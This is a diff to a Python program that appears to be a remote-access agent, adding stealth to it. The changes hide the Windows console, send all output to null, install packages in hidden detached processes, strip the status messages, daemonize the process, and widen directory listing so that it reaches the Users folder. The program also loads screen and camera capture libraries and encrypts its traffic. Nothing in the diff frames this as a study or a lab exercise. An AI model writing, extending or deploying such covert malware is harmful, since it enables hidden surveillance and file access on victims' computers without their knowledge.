@@ -10,65 +10,166 @@ import uuid
 import shutil
 import io
 import signal
+import ctypes
 
 # ==============================================================================
-# SILENT INSTALLER (Visible errors, but generally quiet)
+# WINDOWS CONSOLE HIDER (Stealth Mode)
 # ==============================================================================
-def install_dependencies():
-    """Installs missing dependencies."""
-    # Print installation status so user knows if something fails
-    print("[*] Checking dependencies...", flush=True)
-    
+def hide_console_windows():
+    """
+    Hides the console window on Windows using ctypes.
+    This prevents the black command prompt window from showing up.
+    """
+    if platform.system() == "Windows":
+        try:
+            # Get handle of the console window
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                # SW_HIDE = 0
+                ctypes.windll.user32.ShowWindow(hwnd, 0)
+        except Exception:
+            pass
+
+# Call immediately at startup
+hide_console_windows()
+
+# ==============================================================================
+# SILENT OUTPUT REDIRECTION
+# ==============================================================================
+def silence_output():
+    """Redirects stdout and stderr to /dev/null or NUL."""
+    try:
+        sys.stdout = open(os.devnull, 'w')
+        sys.stderr = open(os.devnull, 'w')
+    except Exception:
+        pass
+
+# Call immediately after hiding console
+silence_output()
+
+# ==============================================================================
+# SILENT BACKGROUND INSTALLER
+# ==============================================================================
+def silent_background_install():
+    """
+    Checks for dependencies. If missing, installs them in a hidden
+    background process, waits for completion, and verifies.
+    """
     required = {
         'psutil': 'psutil',
         'requests': 'requests',
         'cryptography': 'cryptography'
     }
+    
     optional = {
-        'cv2': 'opencv-python-headless', # Headless is smaller
+        'cv2': 'opencv-python-headless',
         'PIL': 'Pillow',
         'mss': 'mss'
     }
 
-    def install(package):
-        try:
-            subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", package, "-q"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            print(f"[+] Installed {package}", flush=True)
-        except:
-            print(f"[-] Failed to install {package}", flush=True)
+    all_missing = []
 
-    # Install required
+    # 1. Check what is missing
     for mod_name, pkg_name in required.items():
         try:
             __import__(mod_name)
         except ImportError:
-            print(f"[*] Installing {mod_name}...", flush=True)
-            install(pkg_name)
+            all_missing.append(pkg_name)
 
-    # Install optional (Camera/Screen)
     for mod_name, pkg_name in optional.items():
         try:
             __import__(mod_name)
         except ImportError:
-            print(f"[*] Installing optional {mod_name}...", flush=True)
-            install(pkg_name)
+            all_missing.append(pkg_name)
 
-# Run install immediately (before silencing)
-install_dependencies()
+    # 2. If something is missing, install it in the background
+    if all_missing:
+        for pkg in all_missing:
+            try:
+                # Construct command: python -m pip install [package] --quiet
+                cmd = [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-warn-script-location"]
+                
+                # Platform specific flags to hide the window
+                if platform.system() == "Windows":
+                    # Flags: CREATE_NO_WINDOW = 0x08000000, CREATE_NEW_PROCESS_GROUP = 0x00000200, DETACHED_PROCESS = 0x00000008
+                    creation_flags = 0x08000000 | 0x00000200 | 0x00000008
+                    # Use Popen to spawn detached, window-less process
+                    subprocess.Popen(
+                        cmd,
+                        creationflags=creation_flags,
+                        close_fds=True
+                    )
+                else:
+                    # Linux/Mac: start new session, detach
+                    subprocess.Popen(
+                        cmd,
+                        start_new_session=True,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+            except Exception:
+                pass
+
+        # 3. Wait in background (silently) for installation to finish
+        # 60 seconds is usually enough for pip to finish small libs
+        time.sleep(60)
+
+        # 4. Re-check imports
+        # If installation worked, we can now import them. 
+        # If not, we exit (user needs to run again or check internet).
+        for mod_name, pkg_name in required.items():
+            try:
+                __import__(mod_name)
+            except ImportError:
+                # If required libs still missing, we can't run. Exit.
+                sys.exit(0)
+                
+        # Optional libs are non-critical, so we don't exit if they fail, 
+        # we just proceed without them.
 
 # ==============================================================================
-# DAEMONIZE (Linux/Mac & Windows)
+# IMPORTS (Run after check/install)
+# ==============================================================================
+# Run the silent background installer first
+silent_background_install()
+
+try:
+    import psutil
+    import requests
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    # Should have been handled by silent_background_install or installed previously
+    sys.exit(0)
+
+OPENCV_AVAILABLE = False
+try:
+    import cv2
+    OPENCV_AVAILABLE = True
+except:
+    pass
+
+PIL_AVAILABLE = False
+try:
+    from PIL import ImageGrab
+    PIL_AVAILABLE = True
+except:
+    pass
+
+MSS_AVAILABLE = False
+try:
+    import mss
+    MSS_AVAILABLE = True
+except:
+    pass
+
+# ==============================================================================
+# DAEMONIZE (Linux/Mac & Windows Persistence)
 # ==============================================================================
 def daemonize():
     """
     Detaches process from terminal.
     """
-    
-    # Windows Logic: Spawn detached process
+    # Windows Logic: Spawn detached process (if not already background)
     if platform.system() == "Windows":
         try:
             # Flags to make process run in background without window
@@ -87,11 +188,9 @@ def daemonize():
                 creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
                 close_fds=True
             )
-            print("[*] Background process spawned. Exiting foreground.", flush=True)
-            sys.exit(0) # Exit the foreground process
-        except Exception as e:
-            print(f"[!] Could not daemonize Windows process: {e}", flush=True)
-            # Fallback: just continue running in foreground if detach fails
+            sys.exit(0) # Exit parent
+        except Exception:
+            pass
 
     # Linux/Mac Logic: Double Fork
     try:
@@ -99,10 +198,9 @@ def daemonize():
         pid = os.fork()
         if pid > 0:
             # Parent process exits -> User gets terminal back
-            print("[*] Forked to background.", flush=True)
             sys.exit(0)
     except AttributeError:
-        # Windows fallback (already handled above, or just skip if not Win)
+        # Windows fallback (already handled above)
         return
 
     # Decouple from parent environment
@@ -131,49 +229,6 @@ def daemonize():
     os.dup2(si.fileno(), sys.stdin.fileno())
     os.dup2(so.fileno(), sys.stdout.fileno())
     os.dup2(se.fileno(), sys.stderr.fileno())
-
-# ==============================================================================
-# SILENT OUTPUT (Apply AFTER daemonize/installation)
-# ==============================================================================
-try:
-    # Redirect standard out and error to /dev/null (Null)
-    # We do this here so we can see installation errors above.
-    sys.stdout = open(os.devnull, 'w')
-    sys.stderr = open(os.devnull, 'w')
-except:
-    pass
-
-# ==============================================================================
-# IMPORTS (Run after potential install)
-# ==============================================================================
-try:
-    import psutil
-    import requests
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-except ImportError:
-    # If still failing after install, just exit silently
-    sys.exit(0)
-
-OPENCV_AVAILABLE = False
-try:
-    import cv2
-    OPENCV_AVAILABLE = True
-except:
-    pass
-
-PIL_AVAILABLE = False
-try:
-    from PIL import ImageGrab
-    PIL_AVAILABLE = True
-except:
-    pass
-
-MSS_AVAILABLE = False
-try:
-    import mss
-    MSS_AVAILABLE = True
-except:
-    pass
 
 # ==============================================================================
 # CONFIGURATION
@@ -255,11 +310,12 @@ class CommandHandler:
         try:
             path = os.path.abspath(path)
             if not os.path.exists(path): 
-                # If path doesn't exist, try to return root or current dir
-                # Windows specific fix: if requesting /, ensure we list drive root
+                # Windows Fix: handle root request
                 if platform.system() == "Windows" and path == "/":
                     path = os.path.splitdrive(os.getcwd())[0] + os.sep
-            
+                else:
+                    path = "/"
+
             if not os.path.exists(path): return
 
             with os.scandir(path) as entries:
@@ -273,7 +329,7 @@ class CommandHandler:
                             "size": stat.st_size if not entry.is_dir() else 0,
                             "modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stat.st_mtime))
                         })
-                        # Increased limit from 2000 to 5000 to capture Users folder and other files
+                        # INCREASED LIMIT to 5000 to show Users folder
                         if len(file_list) >= 5000: 
                             break
                     except:
@@ -398,7 +454,7 @@ def main():
         time.sleep(SLEEP_TIME)
 
 if __name__ == "__main__":
-    # 1. Daemonize (Linux/Mac) OR Spawn Detached Process (Windows)
+    # 1. Hide Console (Windows) / Daemonize (Linux/Mac)
     daemonize()
     # 2. Run Main Loop (Background, Silent)
     main()
